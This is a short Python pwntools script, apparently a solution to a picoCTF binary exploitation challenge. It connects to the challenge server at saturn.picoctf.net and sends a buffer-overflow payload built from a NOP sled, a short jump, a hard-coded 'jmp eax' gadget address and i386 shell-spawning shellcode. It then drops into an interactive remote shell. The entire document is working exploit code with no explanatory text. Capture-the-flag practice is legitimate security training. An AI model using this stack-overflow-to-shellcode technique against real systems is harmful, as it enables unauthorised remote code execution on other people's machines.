from pwn import *

jmp_eax = 0x0805333b
ret=0x804900e

#p = process('./vuln')
p=connect('saturn.picoctf.net',56083)
shellcode = asm(shellcraft.i386.linux.sh())
#gdb.attach(p)

p.recvuntil(b' grasshopper!')
payload =  b"\x90"*26+b'\xeb\x04' + p32(jmp_eax)+ asm(shellcraft.i386.linux.sh())
p.sendline(payload)

p.interactive()
